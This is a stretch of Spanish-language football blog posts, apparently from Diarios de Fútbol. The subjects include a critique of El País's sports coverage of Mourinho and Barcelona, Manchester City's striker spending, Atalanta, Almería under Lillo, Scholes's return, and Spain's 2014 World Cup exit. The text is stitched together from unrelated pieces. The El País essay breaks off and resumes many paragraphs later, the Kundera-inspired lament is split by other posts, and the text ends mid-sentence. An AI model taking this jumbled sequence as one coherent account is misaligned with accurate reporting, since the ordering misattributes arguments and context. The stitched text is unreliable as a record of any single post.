Mundial. Intento cerrar la conversación porque la pizza está en el horno y ya ha pasado un rato. “¿Conoces a algún jugador de ahora de Rumania?” me pregunta. Lobont, Rat y Marica le contesto. “A ver si Marica mete muchos goles en el Getafe” me dice. Ojalá.El pistolero inmortal. El País es mi periódico. Comenzó a serlo hace cerca de treinta años, cuando me acerqué por primera vez a él a través de los pasatiempos y del Pequeño País, hoy tristemente desaparecido. De modo natural, andando los años y la llegada de la adolescencia, comenzaron las lecturas de los interesantes reportajes de El País Semanal, y finalmente la ingestión del diario en pleno, un manjar de imposible comparación con el diario regional que se compraba diariamente en casa de mis padres. Según mis convicciones se modelaban, iba quedando patente que era en estas páginas donde se reflejaba con cierta frecuencia –no siempre, por supuesto- mi forma de acercarme a la vida y de relacionarme con el mundo que me rodeaba, cambiaba y evolucionaba a la vez que yo. Aún a pesar de ciertos matices, esto no ha variado.Andando el tiempo, acabó llegando la época en que Internet nos cambió a muchos el ritmo vital. Y por supuesto, una de las primeras modificaciones que impuso la web en nuestros hábitos fue la posibilidad de asomarnos al mundo en la ventanita del monitor, cada mañana, a través de nuestro periódico favorito. Hablamos del cambio de siglo, y con la lectura diaria imperdonable, descubrimos una preciosa verdad en las páginas de Deportes: otra información deportiva era posible. Había un tal Segurola, que más tarde nos enteraríamos de que era el jefe, que despachaba crónicas y artículos en el justo punto medio entre el mejor periodismo y la buena literatura; por ahí andaba Carlos Arribas, capaz de convertir la más anodina de las carreras en una epopeya homérica; Ramón Besa, una enciclopedia para todo lo referente al barcelonismo; o el gran Enric González, quizá lo más cercano a un oráculo de la sociedad actual, que presentaba oblicuamente las tripas del Calcio con una mezcla de sabiduría e ironía amable cuyo secreto parecía poseer sólo él.No miento si digo que aquellos tipos presentaron una manera diferente de entender el periodismo deportivo en España. A diferencia de los cuatro jinetes –Marca, As, Sport y MD- no presuponían que el aficionado al deporte tuviera que ser, por el mero hecho de serlo, poco exigente con la calidad de las noticias que recibía, ni fanático de ningún equipo. En cambio, le suministraban una información de calidad, trufada de referencias cultas, con atención a los deportes minoritarios, y siempre pendiente de acercarse a la objetividad, el bien más preciado de un buen periodista cuando de transmitir información se trata. Nada sorprendentemente, los seguidores de esta forma de plantear la información deportiva –que encontraba su contrapartida audiovisual en los deportes de Canal Plus- pronto fueron legión, y no pocos nos planteamos escribir de fútbol cuando observamos que el tipo de producto que nosotros deseábamos como lectores, riguroso, imparcial y de calidad, era factible. Es muy probable que sin aquella redacción del País no existiera Diarios de Fútbol ni la mayor parte de los blogs deportivos, y que muchas de las mejores páginas escritas sobre deporte en los últimos años nunca hubieran existido. Dicho de otro modo, aquél fue un modelo del periodismo deportivo. Un modelo que hoy, desgraciadamente, ha desaparecido. Desde que Santiago Segurola abandonó la redacción en 2006 y asumió la dirección José Sámano, se inició una deriva que ha culminado en este último año y medio con la conversión de la sección de Deportes en un panfleto anti-Mourinho, por un lado, y en una continua hagiografía del Barcelona, su entrenador y su plantilla, por el otro. Vaya por delante que los siguientes párrafos no deben entenderse como una defensa de Mourinho, una figura compleja que ha mostrado comportamientos ciertamente cuestionables en España, y en ocasiones hasta abiertamente censurables –dedazo por delante-, ni una crítica de las muchas virtudes del Barcelona, comenzando por su juego frecuentemente deslumbrante, siguiendo por la bendición que es Messi para cualquier aficionado al fútbol, o pudiendo terminar por la figura de Guardiola, en general un modelo de comportamiento. Asimismo, animo a los lectores a que aporten en los comentarios enlaces del periódico que ofrezcan argumentos que enriquezcan el debate, sean favorables o desfavorables a las tesis que se expresan en este artículo, y que provienen únicamente de la lectura diaria de El País.Sobre el primero de los asuntos, tomemos un día cualquiera, en el que apenas haya noticias de la actualidad del Real Madrid: por ejemplo, ayer domingo. Si entramos, encontramos una noticia titulada “Abran paso a Coentrao”, en la cual Diego Torres da a entender que Mourinho, contra la opinión de todo el mundo, ha forzado a Sahin a sabiendas de que podía lesionarse. ¿Qué motivo podría llevarle a querer ver lesionado a un futbolista de su propio equipo? No se justifica directamente, pero se expone que así Coentrao, fichaje pedido explícitamente por Mourinho, tendrá sitio en el once inicial. Justo debajo encontramos otro artículo, también firmado por Torres, en el cual, a partir de la suplencia de Casillas en el Trofeo Bernabéu (!!!) se desgrana toda una teoría según la cual ambos hombres están gravemente enfrentados, se habla de “duelo”, de “tensión”, o de que el entrenador “cuestiona su titularidad”. Nada se dice de que Casillas lo jugó todo el año pasado con Mourinho, por ejemplo. O de que haya sido titular en los dos partidos de la Supercopa. O de que lo fuera ayer. Nada.No es una casualidad. A lo largo de muchos meses, Torres ha creado en sus crónicas un personaje, que en caso de ser real, nadie podría explicarse cómo ha alcanzado los logros del portugués en su profesión. De momento sabemos que es un entrenador al que no le importa que sus jugadores se lesionen, y que no vacila en enfrentarse gratuitamente a su portero y capitán. También hemos aprendido de Torres que Mourinho es un paranoico, un dictador, que actúa guiado por sus sueños,  que pisó a Cesc,  que hostiga, humilla y margina a sus futbolistas, que desprecia los valores del Madrid y que, en el rarísimo caso en que haga algo correctamente, será por casualidad. Incluso, si es el caso, pueden mutilarse declaraciones, por ejemplo de Casillas, para avalar sus argumentos (ver aquí y aquí). Todo este exceso hace que pase a segundo plano la que probablemente sea la parte más interesante y limpia de su trabajo, que es la que concierne al análisis de las tácticas del Real Madrid.La veracidad de las historias que cuenta Torres es imposible de comprobar, por cuanto que él, en su derecho como periodista, no revela sus fuentes. Sin embargo, sí resulta algo más chocante que sus tesis, casi invariablemente, vienen avaladas por “los jugadores” o “el vestuario”, asumiendo una generalización que es muy improbable que sea cierta. Eso cuando los jugadores se manifiestan, porque en general viven atemorizados por su entrenador, sólo un poco menos que un ogro, y por tanto sus habituales manifestaciones públicas de apoyo al mismo no tienen ningún valor (ver aquí, aquí  y aquí, por ejemplo). Si alguien cree que en este estado de cosas un equipo es capaz de anotar más de cien goles, ganar la Copa, quedarse a un palmo de la final de la Champions League y, sobre todo, mostrar la imagen de fortaleza que ha dado el Madrid a lo largo de gran parte de la temporada pasada y el comienzo de ésta, está en su derecho. Podría pensar otro que tal acumulación de ataques a Mourinho obedezcan a una cierta inquina personal del periodista. Puede ocurrir, pero eso no justificaría los ataques que le han llovido a Mourinho desde todas las secciones del País, desde que aterrizó en España. Gonzalo Suárez, bajo el seudónimo de Martin Girard, lanza cada semana en una columna que, con demasiada frecuencia, da vergüenza ajena; José María Izquierdo, habitualmente analista político, autor de dos artículos que sobrepasan cualquier límite (ver aquí y aquí), especialmente el primero; John Carlin –que parece ser el único que en algún momento ha tratado de hablar de Mou con cierta distancia-; Javier Marías, Carlos Boyero, Ramón Besa, Juan José Millás, el propio Sámano, Boris Izaguirre,  Eleonora Giovio, Juan Cruz… Hasta la defensora (?) del lector, requerida por los lectores, asume implícitamente esta línea editorial. Una línea que incluye perlas como “Hannibal Lecter”, “villano”, “aires sanguinarios”, “chantajista”, “proclive a arrastrar por el barro todo lo que le rodea”, “chulesco e intimidante”, “tramposo”,  “payaso”, “malencarado”, “deprimente, triste y poco inteligente”, “arrogante mercenario”, “Lucifer”, etc. y que ha llegado a utilizar para zurrar al entrenador motivos tan peregrinos como el estallido del volcán islandés o la Semana Grande de San Sebastián.Si alguno de los epítetos puede relacionarse con la verdad, la acumulación y el tono habla de una campaña que arrastra por el fango todo lo que había construido el País con tanto esfuerzo, recuerda a otras recientemente vividas, y envía a sus factores a las cloacas más infames no sólo del periodismo deportivo, sino del periodismo a secas.Simon Kuper, periodista inglés con un raro talento para descuartizar el asunto futbolístico armado tan sólo con sentido común y un bisturí que se llama economía, afirma en Soccernomics, léanselo si tienen un ratito, que los clubes ingleses cuya política de salarios tiende a lo esplendido suelen alcanzar el éxito invariablemente. Según Kuper si acercamos el microscopio a los últimos veinte años de cualquier club exitoso comprobaremos que  la correlación entre sueldos pagados y laureles ronda el 90%. Apunta en cambio como la inversión en fichajes solo influye un 16% en el éxito final. En resumen, pagar buenos jornales te acerca mucho más al éxito que hacer saltar la banca con traspasos espectaculares. El caso es que uno lee esto, trata de recordar alguno que le tire con denuedo a los dos supuestos e inmediatamente piensa en el Manchester City. El del sucio dinero thai y las inyecciones de petrodolar, inmersos como están en una doble carrera por ser los mayores agitadores del mercado y los manirrotos por excelencia del fútbol europeo. Lo que me cuesta creer, por más que me prive y mucho Kuper, es que el City pueda seguir a este ritmo endiablado de “libremercadeo” hacia la gloria (o no) durante los próximos 16 años, periodo que Kuper estima el adecuado para evaluar el éxito del club.En Soccernomics también se alerta del mal funcionamiento del mercado futbolístico en materia de empleados. Al contrario que en el caso de los jugadores, donde los cojos suelen pasar hambre y el talento va parejo al éxito y la retribución, es frecuente encontrarse con personas escasamente formadas para los cargos que ocupan en los organigramas de los clubes. Pienso en ex-futbolistas metidos a entrenadores, a ojeadores, a secretarios técnicos, a agentes, a responsables de comunicación. Pienso en Zidane, en Luis Figo o en Stoitchkov. Señala como las malas decisiones que suelen tomar los empleados incapaces, frecuentemente apoyadas en creencias y tradiciones antes que en el análisis profesional, repercuten directamente en que el índice de éxito en las contrataciones sea tan bajo. Para ejemplificar la situación destaca como ejemplo la obsesión de algunos por firmar delanteros sin ton ni son, la posición más sobrevalorada del mercado futbolístico, y mi mente vuelve al celeste.Desde que Thaskin Shinawatra aterrizara en Manchester en 2007 para hacerlo a su manera, para atiborrar el club con fondos de dudosa procedencia, el club ha dado empleo a once delanteros. Un equipo entero. ¿Saben cuantos goles han aportado hasta la fecha? 91 míseros tantos. Valeri Bojinov, Felipe Caicedo, Benjani, Rolando Bianchi, Robinho, Jo, Craig Bellamy, Carlos Tévez, Adebayor, Roque Santa Cruz y Balotelli. Saquen al Apache y léanlo como si fuese una oración de penitencia, les hará más gracia. En resumen, tras cuatro temporadas, incluso ya con el jeque tomando el relevo en el mecenazgo, el City ha obtenido apenas 100 goles a cambio de una inversión en nueves poco menos que absurda. Para que tomen conciencia de los números observen que Fernando Torres anotó 61 en el mismo periodo, Wayne Rooney 51 e incluso un centrocampista veterano como Steven Gerrard hizo 39. Firmar cheques para tirarlos al arroyo es una buena manera de definir la política de contratación del City. Aunque quien sabe, según Kuper y a este ritmo digno de partida enconada en el Monopoly, el City acabará ganando el campeonato de aquí a los próximos veinte años…Por cierto, leo esta mañana en el Guardian que Garry Cook, directivo del club celeste recordado bastante menos por su sapiencia futbolística que por aquella ocasión en la que presentó a Uwe Rösler como nuevo miembro del Hall of Fame del Manchester United cuando  en realidad debía darle la bienvenida al Hall of Fame del City, está ahora mismo en Abu Dhabi despachando con el mecenas en un gabinete seguramente oropelado para contarle entre postre e infusión que el Manchester City necesita urgentemente fichar a un nuevo delantero. Se llama Edin Dzeko, comenta el antiguo ejecutivo de Nike mientras la cara del jeque vira hacia al poker, es bosnio y ha metido 63 goles en la Bundesliga. Mmmm, tenemos un equipo trufado de arietes pero… fichémoslo. ¡Qué demonios! . Es entonces, cuando la pérsica tarde deja pasar al despacho una fina ráfaga de viento, el momento en que la estadística, los números y las progresiones se escapan por la ventana. En el calcio 2011 no ladra solo la Juve. Detrás de una verja oxidada, enredando en la maleza, hay un perro menudo que tiró con tanto brío de la cadena que debía amarrarlo en corto que ha terminado por quebrarla. Atalanta es el chucho,  el oprobio son los chanchullos intolerables del calcioscomesse y los grilletes son los seis puntos de sanción que le impuso la federación por el asunto. Con 15 puntos sobre 21 posibles y un juego notable no hace falta aclarar por qué les pongo el sambenito de bestia a los bergamascos. Cuando nadie daba un duro por ellos, el Atalanta va y es, quizá junto al Cagliari, el equipo revelación de la Serie A.Para comprender el éxito de la Dea no hay que mirar muy alto, con hacerlo a metro y medio del suelo basta. A uno cincuenta y nueve sobre el verde en el Atleti Azzurri d’Italia pasea el craneo futbolísticamente privilegiado de Maximiliano Moralez, posiblemente el jugador más pequeño de la liga pero seguramente uno de los más talentosos. Un escándalo lo del Frasquito. En una plaza poco habituada a presumir de cromos (si acaso Strömberg, Canniggia o Vieri) el sudamericano está dejando su marca a base de exuberancia técnica. Demostrando que hay segundas partes merecen que la pena (su paso por el fútbol ruso fue testimonial por decir algo amable) el enganche argentino es la bisagra que da sentido al mueble.Siguiendo con lo pequeño…”En la plantilla tenemos jóvenes  interesantísimos, mira a Gabbiadini, Marilungo, Bonaventura y algúnotro. Luego tenemos jugadores más experimentados, que vienen jugando en la A desde hace años como Cigarini, Bellini, Masiello, Lucchini, Manfredini o Brighi. Los eqquipos que quieren salvarse deben tener mezcla de juventud y veteranía” Lo dice Stefano Colantuono, el albañil al cargo en el pequeño milagro, y va siendo hora de comenzar a creerle. La historia bonita, la de periodista, aguardaba a Raúl encabalgado en la hazaña hasta depositarse en la última final pero como cabía esperar no pudo ser. Más que nada porque el que tuvo la pluma en la mano siempre fue el Manchester United. Y es que la estampita era demasiado golosa como para que uno de los equipos más competitivos que te puedas echar a la cara lo mirara para no tocarlo. Sí, la repetición de la entrega de 2009, de nuevo contra el Barcelona pero envuelta ahora en la mística de Wembley (un estadio que los red devils pueden considerar su segunda casa) estuvo en la mochila local desde que arrancó la noche. Si gobernar la semifinal con un global de 6-1 y jugando la vuelta con nueve suplentes no es la definición de poderío se le parece bastante.Ni la mirada a un retrovisor que apunta al Chelsea, ni la valentía de Ragnick a la hora de cuadrar su once, ni siquiera la alegría con la que los alemanes pegaron las primeras carreras en Old Trafford apartaron al United del objetivo. Poco a poco los de rojo anestesiaron el choque y a los 20 minutos comenzaron a abrirlo en canal. Darron Gibson cortó con precisión quirúrjica el campo y su pase magistral rasgó el hueco para que Valencia anotará el 1-0 con un tiro raso. Si quedaba una vida por delante y las buenas intenciones visitantes (pelota y Farfán, Jurado, Baumjohann y Draxler juntos por primera vez), comenzaban a bordear el coma imagínense el estado del paciente a la media hora con el segundo en el marcador. Mano a mano entre Gibson, tirito, y un Neuer por vez primera poco inspirado.Con el 0-2 y el billete de vuelta en la mano fue José Manuel Jurado, con ese tiro de media distancia tan característicamente suyo, el que quiso insuflar algo de oxígeno a una eliminatoria sentenciada, golazo el suyo, pero la belleza no fue otra cosa que espejismo. Con Raúl incómodo en el papel de nueve puro, buen marcaje y no es fácil frente a tipos tan vivos como el siete, ni la nueva provisión de medicina vía Huntelaar y Edu terminaron de revitalizar a un once voluntarioso, impresionante campaña, pero escandalosamente inferior. Así las cosas Anderson, tras doble disparo en el área, hizo el tercero y pescó el cuarto aprovechándose de un excelente movimiento de ruptura de Bervatov, pura clase durante la velada. Contundencia justo antes de embarcarse en la mayor aventura del año, en Wembley y frente al mejor equipo del mundo Rusia está corriendo la carrera hacia el Mundial de 2018 pero en su zapatilla se le ha pegado un chicle, una inmundicia que le impide avanzar tan ràpido como querría. Ese chicle se llama racismo. ¿Recuerdan la pancarta que mostraron los ultras del Lokomotiv para celebrar la venta al West Brom del nigeriano Peter Odemwinge?La pizza empieza a oler a quemado. El efecto Lillo. El entrenador más lenguaraz de nuestro fútbol vino en la jornada 16ª a reflotar a un Almería deprimido y gris. Hugo Sánchez, que había salvado al equipo en la temporada anterior, llevaba a la plantilla a la miseria anímica. Episodios como el de Chico ejerciendo de sombra de Xavi adelgazan la moral de un conjunto competitivo y que ha demostrado solidaridad y solvencia suficientes como para permanecer en primera sin demasiados sobresaltos. La irrupción del guipuzcuano tras la destitución del titular en el cargo fue fulgurante, una sola derrota –frente al Sevilla– en sus primeros diez partidos al mando de los almerienses, incluyendo un empate frente al Barcelona y victorias frente a los equipos que jugaban su liga, la evitación del descenso. Parece que Lillo ha renovado con los andaluces, una buena noticia para un equipo que parece haber encontrado su sitio en la Liga BBVA. Las ausencias han marcado más que las presencias este año. Si el curso pasado ya se lamentó la marcha de Emery y la poca fiabilidad de Arconada, este año toca llorar al delantero estrella de los blanquirrojos. Negredo, que hizo parada en Madrid y finalmente en Sevilla, parecía ocupar un hueco difícil de rellenar de nuevo. Goitom, traído del Valladolid para hacer olvidar al vallecano, no ha terminado de cuajar. Es un jugador con más fútbol de equipo que instinto goleador, pero un tanto en veintiún partidos es a todas luces un saldo paupérrimo. La sequía goleadora, que había tocado de muerte a Hugo Sánchez junto a la permeabilidad defensiva, tuvo remedio cuando Juanma Lillo se hizo cargo de la plantilla. Hizo protagonista a Piatti, que ha terminado el ejercicio con 7 goles y sobre todo a Crusat, que ha marcado otros 7.Si le sumamos la eficiciencia de Uche, con 9 goles, podemos concluir que buena parte de responsabilidad de la digna marcha del equipo esta temporada pertenece a este trío de atacantes. Las sensaciones viendo los partidos es que siempre tenían algo que decir, que la posibilidad del gol estaba presente, y no es poco partiendo de la mencionada ausencia de un goleador de clase A como Negredo. La sensibles ausencias de Bruno, Mané o Iriney tampoco pareció perturbar la trayectoria de la Unión Deportiva.Lillo, en mi opinión auténtico artífice del éxito almeriense, ha sabido conjugar sus virtudes ofensivas con una cerrazón atrás que taponase el aluvión de goles encajados en el primer tramo con Hugo Sánchez. Con Acasiete, Soriano, Cisma y Ortiz se blindó en la retaguardia. A esto le sumó la capacidad de sacrificio y disciplina táctica de dos recién llegados, M´Bami y Bernardello que desde el pivote ayudaban atrás y convertían el centro de campo propio en un lugar difícilmente transitable. El dos más dos del fútbol de achique. Concentración en tu cancha y libertad a los delanteros. Ocupar las bandas, mantener la portería intacta, balancear al equipo sin caer en el desorden. Hasta Guardiola reconoció que Lillo había sido un maestro y un referente para él. Con criterios así es fácil entender el fútbol. El Almería, a pequeña escala, logró llevar los conceptos al tapete de hierba y consiguió salvarse cómodamente en una temporada con más trampas que de costumbre.Para el Almería es digno de celebración mantenerse en la división de oro de nuestro fútbol. Son un equipo humilde, con poca experiencia de altura, y cuya buena gestión está haciéndoles un sitio entre los clásicos de nuestra categoría. Otro año arriba, otro año fichando bien sin malgastar. El presidente, Alfonso García, ya habla de renovaciones. Por delante un verano tranquilo, no es poco viviendo en la élite.Lo mejor: La labor del menospreciado Juanma Lillo. El club subo atajar a tiempo el declive de Hugo Sánchez como técnico del equipo.Lo peor: El flojo rendimiento de algunos fichajes, no haber encontrado aún el digno recambio de Negredo. Como no tengo ni idea de fútbol hablo de amor. El escritor checo Milan Kundera utilizó una palabra llamada Litost para describir una preciosa escena veraniega. Dos jóvenes enamorados. Ella, nadadora y fuerte y él algo desastroso y torpe. Al principio nadaban a la par. Ella acomodaba su braceo al braceo de él que, con dificultades, la seguía.Además, ataques como estos provocan un efecto boomerang contrario al esperado, dando lugar a una suerte de victimización en el sujeto, y dificultando que sus defensores y el público moderado en general sea permeable a la frecuente crítica, razonada y justa, que suelen merecer bastantes actitudes del personaje.Si miramos ahora en la dirección opuesta, encontraremos la otra cara de la moneda. Roto el dique del rigor informativo y la distancia periodística, la sección de Deportes de El País podría al menos acercarse a la imparcialidad tratando la información referente al Barcelona con la misma dureza y falta de piedad con sus protagonistas. Sin embargo, es muy difícil encontrar informaciones internas del vestuario que comprometan de algún modo a algún miembro del mismo, e incluso el más mínimo comentario crítico que aluda al equipo culé. Asumiendo incluso que ocurran menos incidentes que en las tripas del Real Madrid, se hace imposible creer que Guardiola no haya tenido una bronca de puertas adentro, que gente como Ibrahimovic –que después lo ha hecho en público no una ni dos veces- no lo cuestionase en privado, o que en la temporada 2007-08, en la que el Barça se hallaba en plena descomposición, casi lo único que apareciera día tras día en el periódico fueran noticias titulares esencialmente positivos (ver aquí, aquí y aquí, por ejemplo). Sí sabemos, en cambio, que lo que le hizo Vilanova a Mourinho fue “una carantoña”,o que las patadas del contrincante justifican un balonazo al público rival. Asimismo, también sabemos que el periodista Luis Martín, encargado habitual de seguir al Barcelona, es un crítico habitual y acerado de Rosell cuando escribe para Sportyou, pero es muy difícil encontrarle alguna crítica al presidente (o a nadie más) cuando escribe para El País, y sin embargo fácil entrevistas tan amables para el entrevistado como ésta o artículos como los que hemos enlazado en el párrafo anterior, en pleno desplome deportivo del Barcelona.En fin, queda poco más que decir,. Sólo reiterar que este artículo debe leerse sobre todo como una alegato de decepción por la deriva que ha tomado la sección de deportes del que yo considero mi periódico, y de pena y tristeza por la desaparición de lo que todos tomamos por un modelo. Asimismo, no deben buscarse ni pedirse aquí críticas a otros medios, primero porque no es la intención de este artículo realizarlas, y segundo porque hay quien lleva años haciéndolo, y mucho mejor de lo que yo podría. Sólo espero que la lea alguien en el lugar correcto para reconducir la situación, porque es una pena que periodistas con tanta capacidad como los que constituyen la sección de Deportes del País ensucien su carrera dejándose llevar por una dinàmica en la que el primer damnificado es su propia credibilidad y el segundo la del medio en el que escriben. Ojalá sea así.Nuestro agradecimiento al compañero Miguel Gutiérrez, por los ánimos, y a José Antonio Hidalgo, sin cuya paciencia recopilando enlaces no hubiera podido escribirse este artículo.La Libreta de Van Gaal A priori parecía la final soñada. Se enfrentaban Brasil e Italia en el Rose Bowl de Los Ángeles por el cetro mundial y, estilos poco atractivos aparte, pocos dudaban de que habían sido las escuadras más consistentes del torneo. Como resultó tristemente previsible, nadie fue capaz de mover el marcador en 120 minutos, y tras ocho penaltis lanzados, Roberto Baggio se veía en la siempre terrible tesitura de necesitar marcar para sobrevivir, no para ganar. El jugador más mágico de la época se vio quizá superado por una responsabilidad que nadie había vivido antes, y en un lanzamiento indigno de su talla envió el esférico al limbo. La fortuna terrible le señaló para siempre, pero nada mejor en este caso que acudir al tópico para auxiliar moralmente al futbolista que había llevado a Italia a la final: los penaltis los fallan los que los tiran. A un día escaso para la final del Mundial, queremos recordar el famoso codazo de Tassotti a Luis Enrique cuando moría el cuarto de final contra Italia en el Mundial de Estados Unidos. Quizá la sangrienta imagen del asturiano descompuesta representa mejor que nadie la historia de infortunios que ha resultado el devenir de la selección en la Copa del Mundo. Un rosario de decepciones que esperamos conjurar el domingo con el mayor, y único, exorcismo posible: un portero levantando un pequeño trofeo. Quizá la mayor alegría colectiva de nuestras vidas. Marcó Scholes. Un gol parecido a muchos suyos, a un solo toque, apareciendo en el segundo palo cuando nadie lo esperaba para romper un partido que acabó cuesta abajo para el United. Y también diferente, porque no le pegó a la pelota en carrera sino en escorzo, a la media vuelta; y no con esa violencia tan marca de la casa, sino con un toque raso, más fino que poderoso, dispensado con la sabiduría del que sabe que va a entrar. Fue acabar el partido, e inundarse los medios de comunicación de imágenes del pelirrojo, el viejo Paul Scholes, he scores goals, genius is back, etc. etc. La imagen que pensamos que nunca volveríamos a ver……y que algunos hubiéramos deseado no volver a ver. Puede ser porque siempre queda bonito cumplir la palabra dada, y siempre admiramos más al que es capaz de apartarse de aquello que ama voluntariamente que al que es apartado a empellones por la evidencia de la decadencia. O tambíén porque cuando un ídolo se retira y recibe el merecido y multitudinario homenaje, una puerta se cierra en cada uno de nosotros, y quien vivía sometido al escrutinio y la crítica del día a día traspasa la puerta del Valhalla para convertirse en mito inviolable. Volver tras el retiro es bastardear todo esto, ensuciando una  leyenda construida a través de veinte años de esfuerzo, y además proyectando una imagen de debilidad, de alguien que no es capaz de adaptarse a su nueva vida.Incluso considerando la vuelta desde motivaciones puramente prácticas: ¿Qué clase de mensaje envías como entrenador poniendo el segundo partido de titular a un tipo que estaba retirado? ¿Qué pensarán los futbolistas que teóricamente deben defender su puesto? Insatisfecho con un presente oscuro, Ferguson ha tirado de la nostalgia de un pasado glorioso, quizá sin pararse a pensar hasta qué punto esta conducta hipoteca el futuro. Qué raro en este hombre que tanto ha dado al fútbol en forma de promesas convertidas en estrellas.Scholes tuvo su época, una época maravillosa. ¿Era tan difícil dejarlo así? El enemigo del fútbol. Siempre conviene quitarse lo peor de encima cuanto antes, así que empezaremos por el final, por el estúpido cantamañanas que arruinó la fiesta granadina en una noche que estaba resultando especialmente feliz. Uno entiende al árbitro cuando vio sangrar a su compañero, aunque resulta discutible la suspensión, toda vez que es un castigo para un público que, en particular, identificó a toda prisa al energúmeno de turno.De repente la chica, aburrida del ritmo lento, acelera su nado y  deja al chico atrás. Él intenta seguirla pero traga agua y se atropella ridículamente, poco a poco se abandona y empieza a sentir litost. Dice Kundera que “la litost es un estado de padecimiento producido por la visión de la propia miseria puesta repentinamente en evidencia”. Pensé en esa palabra anoche. Por la lenta circulación de la bola sobre el césped, con ese rodar entre la nostalgia y la impotencia. No salía nada y lo que salía se tornaba bufonesco o atribulado. Sentí una inmensa tristeza. Jamás he visto un equipo tan desnutrido y acabado. Tan falto de corazón y músculo. Hacía mucho tiempo que el fútbol no me torturaba con escenas tan dramáticas. No es perder. Perder es parte del juego. Es no jugar, es balancearse en el porche como una vieja americana, pasear como almas en pena por el césped, vencidos, como mamíferos pesados agonizando en algún documental de La 2. Como animales andando por andar en la sabana esperando que los derrita el sol o los devore algún carnivoro. El aficionado no merece un espectáculo así, tan ajeno al propio fútbol. No al deporte. Pensé también en maratonianos cansados que corren por inercia hasta desvanecerse al entrar al estadio. Pensé en pelotas de tenis rozando la red y cayendo en nuestro campo. Pensé en un boxeador abrazando al rival con ternura de madre. Pero al fútbol le pido otra cosa. No es un deporte cualquiera. Y ayer lo fue. Y España un equipo más. Con lo que brevemente fuimos. Qué forma de arañar la retina, de retorcerse en la miseria. El litost. Nadar para no llegar nunca al otro lado. De todo, lo que más me conmueve es no tener razones para justificar esta tragedia. No saber qué ha pasado. Ser ciego ante las excusas. No estoy enfadado. Sólo triste. Leo a mis amigos de Diarios de Fútbol y hay ternura en sus palabras. Hemos llegado hasta aquí y hemos sido felices durante un ratito.La vida es un poco así. Alternar la mierda con la luz. Nace un niño y muere un abuelo. Ganamos un Mundial y al siguiente nos vamos a casa. Pero qué pronto ha acabado todo, qué pueril y caprichoso el fútbol que nos lleva todo lo arriba posible y después nos deja caer sin avisar, sin modales, sin tacto. Cómo nos ha despreciado la pelota en Brasil. Nosotros que la tratamos como a uno de los nuestros. Para mí se ha acabado el Mundial. No sé cuantos partidos más veré. Estoy tan hundido, tan al margen de todo lo que pasa en los campos de Brasil. Ayer mientras volvía a casa del bar donde vi el fútbol, un bar donde jamás volveré, envidié a todos esos que caminaban despreocupados. A esos afortunados a los que el fútbol les importa un pepino. No lloré. Es mi rollo. Una amiga siempre me dice con dulzura “qué mayor eres” cuando hago algo que se supone que es mi obligación. Ayer dije “no voy a llorar” mientras en la mesa todos me miraban sabiendo lo chuflas que soy para estas cosas. “Qué mayor eres”, dijo, claro está. Y todos se rieron de mí y con ella. Y está bien así. Aunque empiezo a pensar que me hago mayor y me vuelvo un niño. Lo dice bien Sergio Cortina en el post de antes. Ver a España fracasar nos hace más jóvenes. Nos convierte en niños. En cuando Eloy, Luis Enrique y Zubizarreta. En lo que fuimos mucho tiempo. Qué tristeza llevo encima. Parece que me he echado de colega a un Dementor. “Puto fútbol” fue mi primer mensaje tras el partido en el grupo de whatsapp que compartimos los editores de este blog. No sé si ha sido buena idea leer a Kundera. Ese chico que nada tras su amor pero que lo hace tan mal que siente vergüenza y mucho más que vergüenza. Como ayer la pelota. Como España anoche. Con la basura de los días. Privándonos de las fiestas del mañana. Antes de que los centros comerciales engulleran los estadios, antes de que el estreno de unas botas fuera un acontecimiento mundial, antes de que los equipos pudieran vestir de negro, antes incluso de que la Copa de Europa se empezara a llamar Champions League; el Real Madrid-Juventus era más que fútbol, era más que un cruce, era una cita con la tradición, una rivalidad respetuosa y arrebatada. Era el gol de Mijatovic. Era también el zapatazo de Zalayeta. Era Trezeguet, Suker, Casillas y Buffon. Era Europa así en mayúsculas, con sus campos llenos y la tensión indisimulada frente al televisor.Viendo la clasificación del Grupo B uno puede detectar que pasa algo raro. La Juventus, el equipo que todos creíamos renacido tras dos años dulces en la Lega Calcio, se arrastra por campos inferiores con un juego pastoso, indefinido, feo e inofensivo. Dos empates miserables ante Copenhague y Galatasaray. Nada que ver con la seguridad y brillantez que Conte había propuesto las últimas temporadas, con esa mezcla de asociación arriba y fortaleza abajo. El equilibrio en grado sumo. Como un fortachón que además discurre con elocuencia. Como un culturista que lee a Thomas Pynchon.El Real Madrid sin embargo, pese a las dudas que arrastra en Liga, pasea por la fase de grupos como un favorito claro. El fútbol no va a trompicones, el sistema táctico parece el garabato de un niño, pero las individualidades y la bisoñez de los rivales le dan un 10-1 en el tanteo goleador tras dos victorias inapelables. Aquí es diferente. Aquí el Madrid parece un enclenque altanero. Un canijo que amedranta y que da miedo.Ambos se encuentran hoy en el partido más importante del grupo. El de la resurrección para italianos y el de la confirmación para los españoles. Ninguno llega bien. Peor la Juve quizá tras su inexplicable derrota en Liga frente a la Fiore de Rossi.La tuvo Benzema y la consiguió rechazar bajo palos Piqué. Instantes después, la pelota llegó a los pies de Cristiano Ronaldo. Sin dudarlo un instante, el portugués pateó con dirección hacia la meta de Valdés, obviando la mejor ubicación para el remate de su compañero Benzema. Como si no hubiese otra opción que no fuese la que saliera de sus botas. Fue un disparo inofensivo, tímido, condicionado sin duda por una muy mala elección del luso, muy tapado y alejado de la portería rival. Se equivocó. Es ese egoísmo algo tan habitual y que se da tan por asumido que apenas llamó la atención del público del Bernabéu.No fue el único error en el partido del premio Balón de Oro del año 2013. Ronaldo estuvo lejos, muy lejos de su mejor versión, precisamente en uno de esos partidos en los que al mejor jugador del mundo se le debe exigir demostrar tal condición. Cuando se demandó su presencia en el césped, cuando se requirió que apareciese para reflotar a un Madrid que comenzaba a arrinconarse en torno a su propia área, Ronaldo no apareció. Sí que lo hizo, a mayor abundamiento del flojo partido del portugués, Messi. Su sola presencia atemorizó al rival. Nadando entre líneas consiguió desestabilizar las líneas defensivas madridistas. Regaló el primero a Iniesta, hizo el segundo, colocó a Neymar delante de Diego con un pase inverosímil y acertó a transformar los dos penaltis de que dispuso.El Madrid ganó, con dudas como siempre, pero paso a paso sigue pendiente de la Liga y con el camino medio hecho en Europa. Muchas dudas para ambos equipos, dudas que pueden dilucidarse hoy:¿Volverá Benzema a ser un jugador determinante en Europa? ¿Podrá Pirlo, envejecido e intermitente, hacer girar al equipo entorno a sí mismo? ¿Casarán sobre el campo Illarra y Khedira si finalmente terminan jugando juntos, serán algo más que stoppers o se asociarán arriba como quiere Ancelotti? ¿Jugará el importantísimo Vidal tras 